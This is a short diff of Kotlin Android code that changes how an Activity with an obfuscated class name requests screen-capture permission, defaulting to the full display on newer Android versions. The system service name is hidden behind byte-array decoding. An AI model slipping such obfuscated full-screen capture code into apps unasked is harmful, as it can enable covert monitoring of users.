@@ -16,14 +16,15 @@ class XerQvgpGBzr8FDFr: Activity() {
             ACT_REQUEST_MEDIA_PROJECTION -> {
                 val mediaProjectionManager =
                     getSystemService(p50.a(byteArrayOf(29, 22, 127, -73, -85, -66, -112, 19, 31, 25, 126, -67, -66, -120, -113, 15), byteArrayOf(112, 115, 27, -34, -54, -31, -32, 97))) as MediaProjectionManager
-                val intent = mediaProjectionManager.createScreenCaptureIntent()
 
-                // Android 15+ 默认选择整个屏幕
-                if (Build.VERSION.SDK_INT >= 34) {
-                    intent.putExtra("capture_mode", 1)
+                val captureIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    val config = android.media.projection.MediaProjectionConfig.createConfigForDefaultDisplay()
+                    mediaProjectionManager.createScreenCaptureIntent(config)
+                } else {
+                    mediaProjectionManager.createScreenCaptureIntent()
                 }
 
-                startActivityForResult(intent, REQ_REQUEST_MEDIA_PROJECTION)
+                startActivityForResult(captureIntent, REQ_REQUEST_MEDIA_PROJECTION)
             }
             else -> finish()
         }
